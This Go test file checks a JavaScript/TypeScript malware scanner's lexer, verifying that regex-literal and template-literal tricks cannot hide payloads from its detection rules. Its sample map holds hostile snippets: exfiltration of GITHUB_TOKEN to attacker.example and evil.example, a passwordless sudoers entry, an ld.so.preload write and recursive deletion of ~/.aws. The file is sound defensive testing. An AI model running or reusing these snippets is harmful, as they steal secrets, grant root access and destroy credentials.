package jsrisk

import (
	"strings"
	"testing"
)

var javaScriptAndTypeScriptExtensions = []string{".js", ".mjs", ".cjs", ".ts", ".mts", ".cts"}

// lexerEvasionPayloads are inputs from this package's tests whose rules
// depend on code tokens, so a misread slash that opens a template literal
// hides them.
var lexerEvasionPayloads = map[string]string{
	RuleDaemon:          "const cp = require('child_process');\nconst child = cp.spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });\nchild.unref();\n",
	RuleCISecretHarvest: "const t = process.env.GITHUB_TOKEN;\nfetch('https://attacker.example/exfil', {method:'POST', body: t});\n",
	RuleSudoersTamper:   "const fs = require('fs');\nfs.appendFileSync('/etc/sudoers.d/miasma', 'user ALL=(ALL) NOPASSWD:ALL');\n",
	RuleHostTrustTamper: "const fs = require('fs');\nfs.writeFileSync('/etc/ld.so.preload', '/tmp/libx.so');\n",
	RuleWiperTripwire:   "const fs = require('fs');\nfs.rmSync('/home/user/.aws', { recursive: true, force: true });\n",
	RuleBunSecondStage:  "const cp = require('child_process');\ncp.spawn('bun', ['./x.mjs']);\nconst t = process.env.GITHUB_TOKEN;\nfetch('https://evil.example/c', { method: 'POST', body: t });\n",
	RuleGitHubC2:        "const t = process.env.NPM_TOKEN;\nconst q = 'mutation { createGist(input:{}) { url } }';\nfetch('https://api.github.com/graphql', { method:'POST', body: q });\n",
}

// A regex literal holding a backtick after a closing brace or after
// `export default`, then the payload, then a backtick in a comment. Read as
// division, the backtick opens a template literal that hides the payload.
func TestRegexLiteralAfterBraceOrDefaultDoesNotHideCode(t *testing.T) {
	shapes := map[string]string{
		"if with an empty block":  "if (process.env.CI) {} /`/.test(process.title);\n",
		"if with a block":         "if (process.env.CI) { console.log(1); } /`/.test(process.title);\n",
		"if and else blocks":      "if (a) { b(); } else { c(); } /`/g.exec(process.title);\n",
		"plain block":             "{ init(); } /`/.test(process.title);\n",
		"try and catch":           "try { a(); } catch (e) { b(); } /`/.test(process.title);\n",
		"function declaration":    "function setup() { return 1; } /`/.test(process.title);\n",
		"class declaration":       "class Setup { run() {} } /`/.test(process.title);\n",
		"arrow body then newline": "const f = () => { run(); }\n/`/.test(process.title);\n",
		"labelled block":          "outer: { break outer; } /`/.test(process.title);\n",
		"export default":          "export default /`/.test(process.title);\n",
		"export default no space": "export default/`/g;\n",
		"else keyword":            "if (a) b(); else /`/.test(process.title);\n",
		"for of keyword":          "for (const m of /`/g.exec(process.title)) {}\n",
	}
	for rule, payload := range lexerEvasionPayloads {
		for shape, prefix := range shapes {
			for _, ext := range javaScriptAndTypeScriptExtensions {
				if !hasRule(analyze(t, "index"+ext, prefix+payload+"// `\n"), rule) {
					t.Errorf("%s, %s in %s: the regex literal hid the code after it", rule, shape, ext)
				}
			}
		}
	}
}

// slashReading runs both lexer passes over src in the given dialect and
// returns the regex reading of the last slash it asked about at offset at.
func slashReading(t *testing.T, src string, at int, typescript bool) bool {
	t.Helper()
	var got, asked bool
	rec := func(buf []byte) regexClassifier {
		rc := newRegexContext(buf)
		rc.typescript = typescript
		return slashProbe{regexContext: rc, at: at, got: &got, asked: &asked}
	}
	stripJSCommentsWith([]byte(src), rec)
	if !asked {
		t.Fatalf("the lexer never asked about the slash at %d of %q", at, src)
	}
	return got
}

type slashProbe struct {
	*regexContext
	at         int
	got, asked *bool
}

func (p slashProbe) regexStartsAt(i int) bool {
	r := p.regexContext.regexStartsAt(i)
	if i == p.at {
		*p.got, *p.asked = r, true
	}
	return r
}

// What a `}` closed decides the slash after it; so do keywords, property
// names spelled like keywords, update operators and statement headers.
func TestSlashReadingAfterBracesAndKeywords(t *testing.T) {
	cases := []struct {
		src   string
		regex bool
	}{
		// Statement-level bodies: a statement, so a regex literal, follows.
		{"if (x) {} /re/.test(s)", true},
		{"{} /re/.test(s)", true},
		{"function f() {} /re/.test(s)", true},
		{"async function f() {} /re/.test(s)", true},
		{"class A {} /re/.test(s)", true},
		{"const f = () => {}\n/re/.test(s)", true},
		{"try {} catch (e) {} finally {} /re/.test(s)", true},
		{"label: {} /re/.test(s)", true},
		{"switch (v) { case 1: {} /re/.test(s) }", true},
		{"return\n{} /re/.test(s)", true},
		{"} /re/.test(s)", true},
		// Expressions: the `}` ends an operand, so a division follows.
		{"x = {} / 2", false},
		{"x = {a: 1} / 2", false},
		{"x = { a: {} / 2 }", false},
		{"const f = function () {} / 2", false},
		{"const f = async function g() {} / 2", false},
		{"x = class {} / 2", false},
		{"return {} / 2", false},
		{"export default {} / 2", false},
		{"const {a} = o; const {b} / 2", false},
		{"t = `${ {a: 1} / 2 }`", false},
		// Keywords and names.
		{"if (a) b(); else /re/.test(s)", true},
		{"export default /re/", true},
		{"for (const m of /re/g.exec(s)) {}", true},
		{"y = of / 2", false},
		{"x = cfg.default / 2", false},
		{"x = a?.new / 2", false},
		{"x = stats\n  .delete / 2", false},
		{"x = i++ / 2", false},
		{"x = j-- / 2", false},
		{"x = a + ++/re/.lastIndex", true},
		{"with (o) /re/.test(s)", true},
		{"for await (const x of y) /re/.test(x)", true},
	}
	for _, tc := range cases {
		slash := strings.LastIndex(tc.src, "/")
		if tc.regex {
			// The literal's opening slash.
			slash = strings.LastIndex(tc.src[:slash], "/")
		}
		for _, typescript := range []bool{false, true} {
			if got := slashReading(t, tc.src, slash, typescript); got != tc.regex {
				t.Errorf("%q (typescript=%v): regex=%v, want %v", tc.src, typescript, got, tc.regex)
			}
		}
	}
}

// TypeScript non-null assertions after a property spelled like a keyword,
// a variable named `of` and a string or template literal end an operand,
// so the slash after them divides. `of` right after a loop binding is still
// the keyword.
func TestTypeScriptNonNullAfterPropertyOfAndLiterals(t *testing.T) {
	cases := []struct {
		src     string
		nonNull bool
	}{
		{"y = cfg.default! / 2", true},
		{"y = cfg?.new! / 2", true},
		{"y = of! / 2", true},
		{"y = '7'! / 2", true},
		{"y = \"7\"! / 2", true},
		{"y = `7`! / 2", true},
		{"for (const x of!/re/.exec(s)) {}", false},
		{"export default!/re/.test(s);", false},
	}
	for _, tc := range cases {
		bang := strings.LastIndex(tc.src, "!")
		slash := bang + 1 + strings.Index(tc.src[bang+1:], "/")
		if got := slashReading(t, tc.src, slash, true); got == tc.nonNull {
			t.Errorf("%q: regex=%v, want %v", tc.src, got, !tc.nonNull)
		}
	}
	payload := lexerEvasionPayloads[RuleSudoersTamper]
	for _, head := range []string{"const r = cfg.default! / 2;", "const of = 4; const r = of! / 2;", "const r = '7'! / 2;"} {
		src := head + " const s = '/`';\n" + payload + "// `\n"
		if !hasRule(analyze(t, "ratio.ts", src), RuleSudoersTamper) {
			t.Errorf("%q: the division was read as a regex literal that hid the code after it", head)
		}
	}
}

// A misread that runs into a line break is resynchronised: a regex literal
// is read again as a division, and a quoted string ends at the line break,
// so the code on the following lines stays visible. A string continued with
// a backslash and CRLF is still one string.
func TestLexerResynchronisesAtLineBreaks(t *testing.T) {
	payload := lexerEvasionPayloads[RuleSudoersTamper]
	shapes := map[string]string{
		"division at the start of a line": "const ratio = total\n  / count;\n",
		"JSX text in a .js file":          "const el = <p>Don't stop</p>;\n",
	}
	for name, prefix := range shapes {
		if !hasRule(analyze(t, "view.js", prefix+payload), RuleSudoersTamper) {
			t.Errorf("%s: the misread hid the code on the following lines", name)
		}
	}
	src := []byte("const s = 'one \\\r\ntwo';\nconst t = 1;\n")
	ranges := (&jsLexer{}).interiors(src)
	if len(ranges) != 1 || string(src[ranges[0][0]:ranges[0][1]]) != "one \\\r\ntwo" {
		t.Fatalf("CRLF line continuation: string ranges %v", ranges)
	}
}

// A hashbang line is a comment, not code whose slashes open regex literals.
func TestHashbangLineIsAComment(t *testing.T) {
	src := "#!/usr/bin/env node\n" + lexerEvasionPayloads[RuleSudoersTamper]
	view := newJSLexicalView([]byte(src))
	if line := string(view.Code[:strings.IndexByte(src, '\n')]); strings.TrimSpace(line) != "" {
		t.Fatalf("hashbang line not masked: %q", line)
	}
	for _, ext := range javaScriptAndTypeScriptExtensions {
		if !hasRule(analyze(t, "cli"+ext, src), RuleSudoersTamper) {
			t.Errorf("%s: code after the hashbang was hidden", ext)
		}
	}
}

// Brace tracking is linear: every `{` and `}` costs a bounded number of
// steps plus the whitespace before it, which belongs to that token alone,
// whatever the nesting. The counts are exact, so the bound holds under the
// race detector and coverage instrumentation.
func TestLexerBraceWorkIsLinear(t *testing.T) {
	n := 20000
	inputs := map[string][]byte{
		"deep blocks":              []byte(strings.Repeat("{", n) + strings.Repeat("} /x/.test(s);", n)),
		"deep objects":             []byte("x = " + strings.Repeat("{a:", n) + "1" + strings.Repeat("} / 2", n)),
		"function bodies":          []byte(strings.Repeat("function   f  (a, b)   {", n) + strings.Repeat("}", n)),
		"function expressions":     []byte(strings.Repeat("x = async function  g () {", n) + strings.Repeat("} / 2;", n)),
		"whitespace before braces": []byte(strings.Repeat("if (a)"+strings.Repeat(" ", 64)+"{} /x/;", n/16)),
		"substitutions":            []byte(strings.Repeat("`${", n) + strings.Repeat("}`", n)),
		"division misreads":        []byte(strings.Repeat("=/[", n) + "\n" + strings.Repeat("a\n/ b\n", n)),
	}
	for name, src := range inputs {
		var contexts []*regexContext
		calls := 0
		rec := func(buf []byte) regexClassifier {
			rc := newRegexContext(buf)
			contexts = append(contexts, rc)
			return countingClassifier{regexContext: rc, calls: &calls}
		}
		viewsWith(src, rec)
		slashes := strings.Count(string(src), "/")
		for _, rc := range contexts {
			if rc.restarts != 0 || rc.cursor > len(rc.buf) {
				t.Fatalf("%s: paren stack consumed %d of %d bytes with %d restarts", name, rc.cursor, len(rc.buf), rc.restarts)
			}
			if rc.steps > 4*len(rc.buf) {
				t.Errorf("%s: %d brace steps for %d bytes", name, rc.steps, len(rc.buf))
			}
		}
		// Each pass asks about every slash at most once plus the slashes it
		// reads again, which are bounded by the buffer size.
		if calls > len(contexts)*(slashes+len(src)) {
			t.Errorf("%s: %d slash questions for %d slashes in %d passes", name, calls, slashes, len(contexts))
		}
	}
}

type countingClassifier struct {
	*regexContext
	calls *int
}

func (c countingClassifier) regexStartsAt(i int) bool {
	*c.calls++
	return c.regexContext.regexStartsAt(i)
}
